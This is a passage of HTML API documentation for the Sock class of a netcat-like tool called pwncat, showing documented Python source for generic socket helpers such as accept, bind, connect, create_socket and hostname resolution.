            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">except</span> socket.error:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-comment"># [2/4] optional module: ipaddress</span>
    <span class="hljs-keyword">try</span>:
        addr = unicode(host)  <span class="hljs-comment"># type: ignore</span>
    <span class="hljs-keyword">except</span> NameError:
        addr = host
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">try</span>:
            ipaddress.IPv6Address(addr)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">except</span> ipaddress.AddressValueError:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">except</span> NameError:
        <span class="hljs-keyword">pass</span>

    <span class="hljs-comment"># [3/4] regex</span>
    <span class="hljs-comment"># This is a poor mans solution, but we only want to know if it</span>
    <span class="hljs-comment"># is on the format of IPv6 and not if it is a valid IPv6. The</span>
    <span class="hljs-comment"># validation will be figured out during connect()</span>
    reg = <span class="hljs-string">r"^([a-f0-9]{0,4}:){5}[a-f0-9]{0,4}$"</span>
    <span class="hljs-keyword">if</span> re.match(reg, host):
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-comment"># [4/4] Nope</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Methods</h3>
                    <dl>
                        <dt id="pwncat.Sock.accept"><code class="name flex">
                            <span>def <span class="ident">accept</span></span>(<span>self, sockets, has_quit, select_timeout=0.01)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Accept a single connection from given list of
                                sockets.</p>
                                <p>Given sockets must be bound to an addr and listening for
                                    connections.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>sock</code></strong>
                                        :<code>[socket.socket]</code></dt>
                                    <dd>List of sockets IPv4 and/or IPv6 to accept on.</dd>
                                    <dt><strong><code>has_quit</code></strong> :<code>Callable[[],
                                        bool]</code></dt>
                                    <dd>A function that returns True if abort is requested.</dd>
                                    <dt><strong><code>select_timeout</code></strong>
                                        :<code>float</code></dt>
                                    <dd>Timeout to poll sockets for connected clients.</dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <p>(socket.socket, str, int): Returns tuple of socket, address and
                                    port of client.</p>
                                <h2 id="raises">Raises</h2>
                                <dl>
                                    <dt><code>socket.error</code></dt>
                                    <dd>Raised if server cannot accept connection or stop signal is
                                        requested.
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">accept</span>(<span
                                        class="hljs-params">
    self,
    sockets,  <span class="hljs-comment"># type: List[socket.socket]</span>
    has_quit,  <span class="hljs-comment"># type: Callable[[], bool]</span>
    select_timeout=<span class="hljs-number">0.01</span>,  <span
                                        class="hljs-comment"># type: float</span>
</span>):</span>
    <span class="hljs-comment"># type: (...) -&gt; Tuple[socket.socket, Tuple[str, int]]</span>
    <span class="hljs-string">"""Accept a single connection from given list of sockets.

    Given sockets must be bound to an addr and listening for connections.

    Args:
        sock ([socket.socket]): List of sockets IPv4 and/or IPv6 to accept on.
        has_quit (Callable[[], bool]): A function that returns True if abort is requested.
        select_timeout (float): Timeout to poll sockets for connected clients.

    Returns:
        (socket.socket, str, int): Returns tuple of socket, address and port of client.

    Raises:
        socket.error: Raised if server cannot accept connection or stop signal is requested.
    """</span>
    self.__log.debug(<span class="hljs-string">"Waiting for TCP client"</span>)
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">try</span>:
            ssockets = select.select(sockets, [], [], select_timeout)[
                <span class="hljs-number">0</span>
            ]  <span class="hljs-comment"># type: List[socket.socket]</span>
        <span class="hljs-keyword">except</span> select.error <span class="hljs-keyword">as</span> err:
            <span class="hljs-keyword">raise</span> socket.error(err)
        <span class="hljs-keyword">if</span> has_quit():
            <span class="hljs-keyword">raise</span> socket.error(<span class="hljs-string">"SOCK-QUIT signal ACK for accept(): raised socket.error()"</span>)
        <span class="hljs-keyword">for</span> sock <span class="hljs-keyword">in</span> ssockets:
            <span class="hljs-keyword">try</span>:
                conn, addr = sock.accept()
            <span class="hljs-keyword">except</span> (socket.gaierror, socket.error) <span
                                            class="hljs-keyword">as</span> error:
                msg = <span class="hljs-string">"Accept failed: {}"</span>.format(error)
                self.__log.error(msg)
                <span class="hljs-keyword">raise</span> socket.error(msg)
            self.__log.info(
                <span class="hljs-string">"Client connected from %s:%d (family %d/%s, TCP)"</span>,
                addr[<span class="hljs-number">0</span>],
                addr[<span class="hljs-number">1</span>],
                int(conn.family),
                self.get_family_name(conn.family),
            )
            <span class="hljs-keyword">return</span> conn, (addr[<span class="hljs-number">0</span>], addr[<span
                                            class="hljs-number">1</span>])</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.bind"><code class="name flex">
                            <span>def <span class="ident">bind</span></span>(<span>self, sock, addr, port)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Bind the socket to an address.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>sock</code></strong>
                                        :<code>socket.socket</code></dt>
                                    <dd>The socket to bind.</dd>
                                    <dt><strong><code>addr</code></strong> :<code>str</code></dt>
                                    <dd>The numerical IP address to bind to.</dd>
                                    <dt><strong><code>port</code></strong> :<code>int</code></dt>
                                    <dd>The port to bind to.</dd>
                                </dl>
                                <h2 id="raises">Raises</h2>
                                <p>socket.error if socket cannot be bound.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">bind</span>(<span
                                        class="hljs-params">self, sock, addr, port</span>):</span>
    <span class="hljs-comment"># type: (socket.socket, str, int) -&gt; None</span>
    <span class="hljs-string">"""Bind the socket to an address.

    Args:
        sock (socket.socket): The socket to bind.
        addr (str): The numerical IP address to bind to.
        port (int): The port to bind to.

    Raises:
        socket.error if socket cannot be bound.
    """</span>
    sock_family_name = self.get_family_name(sock.family)
    sock_type_name = self.get_type_name(sock.type)
    self.__log.debug(
        <span class="hljs-string">"Binding (family %d/%s, %s) socket to %s:%d"</span>,
        int(sock.family),
        sock_family_name,
        sock_type_name,
        addr,
        port,
    )
    <span class="hljs-keyword">try</span>:
        sock.bind((addr, port))
    <span class="hljs-keyword">except</span> (OverflowError, OSError, socket.gaierror, socket.error) <span
                                            class="hljs-keyword">as</span> error:
        msg = <span class="hljs-string">"Binding (family {}/{}, {}) socket to {}:{} failed: {}"</span>.format(
            sock.family, sock_family_name, sock_type_name, addr, port, error
        )
        <span class="hljs-keyword">raise</span> socket.error(msg)</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.close"><code class="name flex">
                            <span>def <span class="ident">close</span></span>(<span>self, sock, name)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Shuts down and closes a socket.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>sock</code></strong>
                                        :<code>socket.socket</code></dt>
                                    <dd>Socket to shutdown and close.</dd>
                                    <dt><strong><code>name</code></strong> :<code>str</code></dt>
                                    <dd>Name of the socket used for logging purposes.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">close</span>(<span
                                        class="hljs-params">self, sock, name</span>):</span>  <span
                                        class="hljs-comment"># pylint: disable=unused-argument,no-self-use</span>
    <span class="hljs-comment"># type: (socket.socket, str) -&gt; None</span>
    <span class="hljs-string">"""Shuts down and closes a socket.

    Args:
        sock (socket.socket): Socket to shutdown and close.
        name (str): Name of the socket used for logging purposes.
    """</span>
    <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Logging is removed here as this is too much overhead when using</span>
    <span class="hljs-comment"># the port scanner (it will have thousands of threads and too many</span>
    <span class="hljs-comment"># calls to the logger which will cause issues with its shutdown</span>
    <span class="hljs-comment"># and a massive performance degrade as well.</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># (SHUT_RD)   0 = Done receiving (disallows receiving)</span>
        <span class="hljs-comment"># (SHUT_WR)   1 = Done sending (disallows sending)</span>
        <span class="hljs-comment"># (SHUT_RDWR) 2 = Both</span>
        <span class="hljs-comment"># self.__log.trace("Shutting down %s socket", name)  # type: ignore</span>
        sock.shutdown(socket.SHUT_RDWR)
    <span class="hljs-keyword">except</span> (OSError, socket.error):
        <span class="hljs-comment"># We do not log errors here, as unconnected sockets cannot</span>
        <span class="hljs-comment"># be shutdown and we want to throw any socket at this function.</span>
        <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># self.__log.trace("Closing %s socket", name)  # type: ignore</span>
        sock.close()
    <span class="hljs-keyword">except</span> (OSError, socket.error):
        <span class="hljs-keyword">pass</span>
        <span class="hljs-comment"># self.__log.trace("Could not close %s socket: %s", name, error)  # type: ignore</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.connect"><code class="name flex">
                            <span>def <span class="ident">connect</span></span>(<span>self, sock, addr, port, src_addr=None, src_port=None, udp_sconnect=False, udp_send_payload=b'', udp_recv_bufsize=8192, udp_recv_timeout=0.1)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Connect to a remote socket at given address and
                                port.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>sock</code></strong>
                                        :<code>socket.socket</code></dt>
                                    <dd>The socket to use for connecting/communication.</dd>
                                    <dt><strong><code>addr</code></strong> :<code>str</code></dt>
                                    <dd>Numerical IP address of server to connect to.</dd>
                                    <dt><strong><code>port</code></strong> :<code>int</code></dt>
                                    <dd>Port of server to connect to.</dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>Tuple[str,int]</code></dt>
                                    <dd>Adress/port tuple of local bind of the client.</dd>
                                </dl>
                                <h2 id="raises">Raises</h2>
                                <dl>
                                    <dt><code>socker.error</code></dt>
                                    <dd>If client cannot connect to remote peer or custom bind did
                                        not succeed.
                                    </dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">connect</span>(<span
                                        class="hljs-params">
    self,
    sock,  <span class="hljs-comment"># type: socket.socket</span>
    addr,  <span class="hljs-comment"># type: str</span>
    port,  <span class="hljs-comment"># type: int</span>
    src_addr=None,  <span class="hljs-comment"># type: Optional[str]</span>
    src_port=None,  <span class="hljs-comment"># type: Optional[int]</span>
    udp_sconnect=False,  <span class="hljs-comment"># type: bool</span>
    udp_send_payload=<span class="hljs-string">b""</span>,  <span
                                        class="hljs-comment"># type: bytes</span>
    udp_recv_bufsize=<span class="hljs-number">8192</span>,  <span
                                        class="hljs-comment"># type: int</span>
    udp_recv_timeout=<span class="hljs-number">0.1</span>,  <span
                                        class="hljs-comment"># type: float</span>
</span>):</span>
    <span class="hljs-comment"># type: (...) -&gt; Tuple[str, int]</span>
    <span class="hljs-string">"""Connect to a remote socket at given address and port.

    Args:
        sock (socket.socket): The socket to use for connecting/communication.
        addr (str): Numerical IP address of server to connect to.
        port (int): Port of server to connect to.

    Returns:
        Tuple[str,int]: Adress/port tuple of local bind of the client.

    Raises:
        socker.error: If client cannot connect to remote peer or custom bind did not succeed.
    """</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># If the socket was already closed elsewhere, it won't have family or type anymore</span>
        sock_family_name = self.get_family_name(sock.family)
        sock_type_name = self.get_type_name(sock.type)
    <span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> error:
        <span class="hljs-keyword">raise</span> socket.error(error)

    <span class="hljs-comment"># Bind to a custom addr/port</span>
    <span class="hljs-keyword">if</span> src_addr <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span> <span
                                            class="hljs-keyword">and</span> src_port <span
                                            class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span>:
        <span class="hljs-keyword">try</span>:
            self.__log.debug(<span class="hljs-string">"Binding specifically to %s:%d"</span>, src_addr, src_port)
            self.bind(sock, src_addr, src_port)
        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> error:
            <span class="hljs-keyword">raise</span> socket.error(error)
    <span class="hljs-keyword">try</span>:
        self.__log.debug(
            <span class="hljs-string">"Connecting to %s:%d (family %d/%s, %s)"</span>,
            addr,
            port,
            int(sock.family),
            sock_family_name,
            sock_type_name,
        )

        <span class="hljs-comment"># Ensure to use connect() protocol independent</span>
        info = socket.getaddrinfo(addr, port, sock.family, sock.type, sock.proto)
        sock.connect(info[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>])

        <span class="hljs-comment"># UDP stateful connect</span>
        <span class="hljs-comment"># A UDP client doesn't know if the connect() was successful, so the trick</span>
        <span class="hljs-comment"># is to send an empty packet and see if an exception is triggered during</span>
        <span class="hljs-comment"># receive or simply a timeout (which means success).</span>
        <span class="hljs-keyword">if</span> udp_sconnect <span class="hljs-keyword">and</span> int(sock.type) == int(socket.SOCK_DGRAM):
            <span class="hljs-keyword">assert</span> type(udp_send_payload) <span
                                            class="hljs-keyword">is</span> bytes
            <span class="hljs-keyword">assert</span> type(udp_recv_bufsize) <span
                                            class="hljs-keyword">is</span> int
            <span class="hljs-comment"># Some applications like netcat do not like to receive empty</span>
            <span class="hljs-comment"># data, as they treat it as an EOF and will quit upon receive,</span>
            <span class="hljs-comment"># so we're using a nullbyte character instead.</span>
            self.__log.debug(
                <span class="hljs-string">"Trying to send %d bytes (%s) for UDP stateful connect"</span>,
                len(udp_send_payload),
                repr(udp_send_payload),
            )
            sock.send(udp_send_payload)
            sock.settimeout(udp_recv_timeout)
            <span class="hljs-keyword">try</span>:
                sock.recv(udp_recv_bufsize)
            <span class="hljs-keyword">except</span> socket.timeout:
                <span class="hljs-keyword">pass</span>
            <span class="hljs-keyword">finally</span>:
                sock.settimeout(<span class="hljs-number">0</span>)

    <span class="hljs-keyword">except</span> (OSError, socket.error) <span
                                            class="hljs-keyword">as</span> error:
        msg = <span class="hljs-string">"Connecting to {}:{} (family {}/{}, {}) failed: {}"</span>.format(
            addr,
            port,
            sock.family,
            sock_family_name,
            sock_type_name,
            error,
        )
        <span class="hljs-keyword">raise</span> socket.error(msg)

    local = sock.getsockname()
    self.__log.debug(
        <span class="hljs-string">"Connected from %s:%d"</span>,
        local[<span class="hljs-number">0</span>],
        local[<span class="hljs-number">1</span>],
    )
    self.__log.info(
        <span class="hljs-string">"Connected to %s:%d (family %d/%s, %s)"</span>,
        addr,
        port,
        int(sock.family),
        sock_family_name,
        sock_type_name,
    )
    <span class="hljs-keyword">return</span> (local[<span class="hljs-number">0</span>], local[<span
                                            class="hljs-number">1</span>])</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.create_socket"><code class="name flex">
                            <span>def <span class="ident">create_socket</span></span>(<span>self, family, sock_type, reuse_addr, ip_tos_name=None)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Create TCP or UDP socket.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>family</code></strong>
                                        :<code>socket.family</code></dt>
                                    <dd>The address family for which to create the socket for.</dd>
                                    <dt><strong><code>sock_type</code></strong> :<code>int</code>
                                    </dt>
                                    <dd>The socket type: socket.SOCK_DGRAM or socket.SOCK_STREAM
                                    </dd>
                                    <dt><strong><code>reuse_addr</code></strong> :<code>bool</code>
                                    </dt>
                                    <dd>Set SO_REUSEADDR on the socket.</dd>
                                    <dt><strong><code>ip_tos_name</code></strong> :<code>str</code>
                                    </dt>
                                    <dd>Optional IP type of service value to apply to socket</dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>socket.socket</code></dt>
                                    <dd>Returns TCP or UDP socket for the given address family.</dd>
                                </dl>
                                <h2 id="raises">Raises</h2>
                                <dl>
                                    <dt><code>socket.error</code></dt>
                                    <dd>If socket cannot be created.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">create_socket</span>(<span
                                        class="hljs-params">self, family, sock_type, reuse_addr, ip_tos_name=None</span>):</span>
    <span class="hljs-comment"># type: (Union[socket.AddressFamily, int], int, bool, Optional[str]) -&gt; socket.socket</span>
    <span class="hljs-string">"""Create TCP or UDP socket.

    Args:
        family (socket.family): The address family for which to create the socket for.
        sock_type (int): The socket type: socket.SOCK_DGRAM or socket.SOCK_STREAM
        reuse_addr (bool): Set SO_REUSEADDR on the socket.
        ip_tos_name (str): Optional IP type of service value to apply to socket

    Returns:
        socket.socket: Returns TCP or UDP socket for the given address family.

    Raises:
        socket.error: If socket cannot be created.
    """</span>
    <span class="hljs-keyword">assert</span> int(sock_type) <span class="hljs-keyword">in</span> [int(socket.SOCK_DGRAM), int(socket.SOCK_STREAM)]
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> int(sock_type) == int(socket.SOCK_DGRAM):
            self.__log.debug(
                <span class="hljs-string">"Creating (family %d/%s, UDP) socket"</span>, int(family), self.get_family_name(family)
            )
            sock = socket.socket(family, socket.SOCK_DGRAM)
        <span class="hljs-keyword">else</span>:
            self.__log.debug(
                <span class="hljs-string">"Creating (family %d/%s, TCP) socket"</span>, int(family), self.get_family_name(family)
            )
            sock = socket.socket(family, socket.SOCK_STREAM)
    <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> error:
        msg = <span class="hljs-string">"Creating (family {}/{}, {}) socket failed: {}"</span>.format(
            int(family), self.get_family_name(family), self.get_type_name(sock_type), error
        )
        self.__log.debug(msg)
        <span class="hljs-keyword">raise</span> socket.error(msg)

    <span class="hljs-keyword">if</span> family == socket.AF_INET6:
        <span class="hljs-comment"># On Linux, IPv6 sockets accept IPv4 too by default, but this makes</span>
        <span class="hljs-comment"># it impossible to bind to both 0.0.0.0 in IPv4 and :: in IPv6.</span>
        <span class="hljs-comment"># On other systems, separate sockets *must* be used to listen for</span>
        <span class="hljs-comment"># both IPv4 and IPv6. For consistency, always disable IPv4 on our</span>
        <span class="hljs-comment"># IPv6 sockets and use a separate ipv4 socket when needed.</span>
        <span class="hljs-comment">#</span>
        <span class="hljs-comment"># Python 2.x on windows doesn't have IPPROTO_IPV6.</span>
        <span class="hljs-keyword">if</span> hasattr(socket, <span class="hljs-string">"IPPROTO_IPV6"</span>):
            self.__log.debug(
                <span class="hljs-string">"Disabling IPv4 support on %s socket"</span>, self.get_family_name(family)
            )
            sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, <span
                                            class="hljs-number">1</span>)

    <span class="hljs-comment"># Get around the "[Errno 98] Address already in use" error, if the socket is still in wait</span>
    <span class="hljs-comment"># we instruct it to reuse the address anyway.</span>
    <span class="hljs-keyword">if</span> reuse_addr:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)

    <span class="hljs-comment"># If requested, set IP Type of Service value for current socket</span>
    <span class="hljs-keyword">if</span> ip_tos_name <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span>:
        ip_tos_val = self.get_iptos_by_name(ip_tos_name)
        self.__log.debug(<span class="hljs-string">"Setting IP_TOS to: %d (%s)"</span>, ip_tos_val, ip_tos_name)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, ip_tos_val)
    <span class="hljs-comment"># All done, return it to the requestor</span>
    <span class="hljs-keyword">return</span> sock</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.get_family_name"><code class="name flex">
                            <span>def <span class="ident">get_family_name</span></span>(<span>self, family)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Returns human readable name of given address family
                                as str.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">get_family_name</span>(<span
                                        class="hljs-params">self, family</span>):</span>
    <span class="hljs-comment"># type: (Union[socket.AddressFamily, int]) -&gt; str</span>
    <span class="hljs-string">"""Returns human readable name of given address family as str."""</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">return</span> self.__AF_HUMAN[int(family)]
    <span class="hljs-keyword">except</span> KeyError:
        self.__log.error(
            <span class="hljs-string">"Invalid key for address family: %s (type: %s) (valid: %s)"</span>,
            repr(family),
            repr(type(family)),
            repr(self.__AF_HUMAN),
        )
        <span class="hljs-keyword">return</span> <span
                                            class="hljs-string">"unknown"</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.get_iptos_by_name"><code class="name flex">
                            <span>def <span class="ident">get_iptos_by_name</span></span>(<span>self, name)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Get IP Type of Service hexadecimal value by
                                name.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">get_iptos_by_name</span>(<span
                                        class="hljs-params">self, name</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; int</span>
    <span class="hljs-string">"""Get IP Type of Service hexadecimal value by name."""</span>
    <span class="hljs-keyword">assert</span> name <span class="hljs-keyword">in</span> self.__IP_TOS
    <span class="hljs-keyword">return</span> self.__IP_TOS[name]</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.get_sock_opts"><code class="name flex">
                            <span>def <span class="ident">get_sock_opts</span></span>(<span>self, sock, opts)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Debug logs configured socket options.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">get_sock_opts</span>(<span
                                        class="hljs-params">self, sock, opts</span>):</span>
    <span class="hljs-comment"># type: (Sock, socket.socket, Optional[str]) -&gt; List[str]</span>
    <span class="hljs-string">"""Debug logs configured socket options."""</span>
    <span class="hljs-keyword">if</span> opts <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> []
    <span class="hljs-keyword">assert</span> opts <span class="hljs-keyword">in</span> [<span
                                            class="hljs-string">"all"</span>, <span
                                            class="hljs-string">"sock"</span>, <span
                                            class="hljs-string">"ipv4"</span>, <span
                                            class="hljs-string">"ipv6"</span>, <span
                                            class="hljs-string">"tcp"</span>], <span
                                            class="hljs-string">"Value: {}"</span>.format(repr(opts))
    info = []
    <span class="hljs-keyword">for</span> proto, optnames <span class="hljs-keyword">in</span> self.__SOCK_OPTS.items():
        <span class="hljs-keyword">if</span> opts == <span class="hljs-string">"all"</span> <span
                                            class="hljs-keyword">or</span> proto.lower() == opts:
            <span class="hljs-keyword">for</span> optname <span class="hljs-keyword">in</span> optnames:
                <span class="hljs-keyword">if</span> proto.lower() == <span class="hljs-string">"sock"</span>:
                    level = socket.SOL_SOCKET
                <span class="hljs-keyword">elif</span> proto.lower() == <span class="hljs-string">"ipv4"</span>:
                    level = socket.IPPROTO_IP
                <span class="hljs-keyword">elif</span> proto.lower() == <span class="hljs-string">"ipv6"</span>:
                    level = socket.IPPROTO_IPV6
                <span class="hljs-keyword">elif</span> proto.lower() == <span class="hljs-string">"tcp"</span>:
                    level = socket.IPPROTO_TCP
                <span class="hljs-keyword">try</span>:
                    info.append(
                        <span class="hljs-string">"{}: {}: {}"</span>.format(
                            proto,
                            optname,
                            sock.getsockopt(
                                level, eval(<span
                                            class="hljs-string">"socket."</span> + optname)  <span
                                            class="hljs-comment"># pylint: disable=eval-used</span>
                            ),
                        )
                    )
                <span class="hljs-keyword">except</span> AttributeError:
                    <span class="hljs-keyword">pass</span>
                <span class="hljs-keyword">except</span> (OSError, socket.error):
                    <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">return</span> info</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.get_type_name"><code class="name flex">
                            <span>def <span class="ident">get_type_name</span></span>(<span>self, sock_type)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Returns human readable name of given socket type as
                                str.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">get_type_name</span>(<span
                                        class="hljs-params">self, sock_type</span>):</span>
    <span class="hljs-comment"># type: (int) -&gt; str</span>
    <span class="hljs-string">"""Returns human readable name of given socket type as str."""</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">return</span> self.__ST_HUMAN[int(sock_type)]
    <span class="hljs-keyword">except</span> KeyError:
        self.__log.error(
            <span class="hljs-string">"Invalid key for address sock_type: %s (type: %s) (valid: %s)"</span>,
            repr(sock_type),
            repr(type(sock_type)),
            repr(self.__ST_HUMAN),
        )
        <span class="hljs-keyword">return</span> <span
                                            class="hljs-string">"unknown"</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.Sock.gethostbyname"><code class="name flex">
                            <span>def <span class="ident">gethostbyname</span></span>(<span>self, host, family, resolvedns)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Translate hostname into a IP address for a given
                                address family.</p>
                                <h2 id="args">Args</h2>
                                <dl>
                                    <dt><strong><code>host</code></strong> :<code>str</code></dt>
                                    <dd>The hostname to resolvea.</dd>
                                    <dt><strong><code>family</code></strong>
                                        :<code>socket.family</code></dt>
                                    <dd>IPv4 or IPv6 family</dd>
                                </dl>
                                <h2 id="returns">Returns</h2>
                                <dl>
                                    <dt><code>str</code></dt>
                                    <dd>Numeric IP address.</dd>
                                </dl>
                                <h2 id="raises">Raises</h2>
                                <dl>
                                    <dt><code>socket.gaierror</code></dt>
                                    <dd>If hostname cannot be resolved.</dd>
                                </dl>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span class="hljs-function"><span
                                        class="hljs-keyword">def</span> <span class="hljs-title">gethostbyname</span>(<span
                                        class="hljs-params">self, host, family, resolvedns</span>):</span>
    <span class="hljs-comment"># type: (Sock, Optional[str], Union[socket.AddressFamily, int], bool) -&gt; str</span>
    <span class="hljs-string">"""Translate hostname into a IP address for a given address family.

    Args:
        host (str): The hostname to resolvea.
        family (socket.family): IPv4 or IPv6 family

    Returns:
        str: Numeric IP address.

    Raises:
        socket.gaierror: If hostname cannot be resolved.
    """</span>
    socktype = <span class="hljs-number">0</span>
    proto = <span class="hljs-number">0</span>
    flags = <span class="hljs-number">0</span>
    port = <span class="hljs-literal">None</span>
    family = int(family)

    <span class="hljs-comment"># [1/4] Wildcard without host</span>
    <span class="hljs-keyword">if</span> host <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span>:
        <span class="hljs-keyword">if</span> family == int(socket.AF_INET):
            self.__log.debug(<span class="hljs-string">"Resolving IPv4 name not required, using wildcard: 0.0.0.0"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-string">"0.0.0.0"</span>
        <span class="hljs-keyword">if</span> family == int(socket.AF_INET6):
            self.__log.debug(<span class="hljs-string">"Resolving IPv6 name not required, using wildcard: ::"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-string">"::"</span>
    <span class="hljs-keyword">assert</span> host <span class="hljs-keyword">is</span> <span
                                            class="hljs-keyword">not</span> <span
                                            class="hljs-literal">None</span>

    <span class="hljs-comment"># [2/4] Already an IP address</span>
    <span class="hljs-keyword">if</span> family == int(socket.AF_INET6):
        <span class="hljs-keyword">if</span> Sock.is_ipv6_address(host):
            self.__log.debug(<span class="hljs-string">"Resolving IPv6 name not required, already an IP: %s"</span>, host)
            <span class="hljs-keyword">return</span> host
        <span class="hljs-comment"># Map IPv4 address to IPv6</span>
        host6 = <span class="hljs-string">"::ffff:"</span> + host
        <span class="hljs-keyword">if</span> Sock.is_ipv6_address(host6):
            self.__log.debug(<span class="hljs-string">"Resolving IPv4 name not required, changing to IPv6: %s"</span>, host6)
            <span class="hljs-keyword">return</span> host6
    <span class="hljs-keyword">elif</span> family == int(socket.AF_INET):
        <span class="hljs-keyword">if</span> Sock.is_ipv4_address(host):
            self.__log.debug(<span class="hljs-string">"Resolving IPv4 host not required, already an IP: %s"</span>, host)
            <span class="hljs-keyword">return</span> host

    <span class="hljs-comment"># [3/4] Do we disable DNS resolution?</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resolvedns:
        flags = socket.AI_NUMERICHOST

    <span class="hljs-comment"># [4/4] Resolve</span>
    <span class="hljs-keyword">try</span>:
        infos = socket.getaddrinfo(host, port, family, socktype, proto, flags)
        addr = str(infos[<span class="hljs-number">0</span>][<span
                                            class="hljs-number">4</span>][<span class="hljs-number">0</span>])
        self.__log.debug(<span class="hljs-string">"Resolved %s host: %s"</span>, self.get_family_name(family), addr)
        <span class="hljs-keyword">return</span> addr
    <span class="hljs-keyword">except</span> (AttributeError, socket.gaierror) <span
                                            class="hljs-keyword">as</span> error:
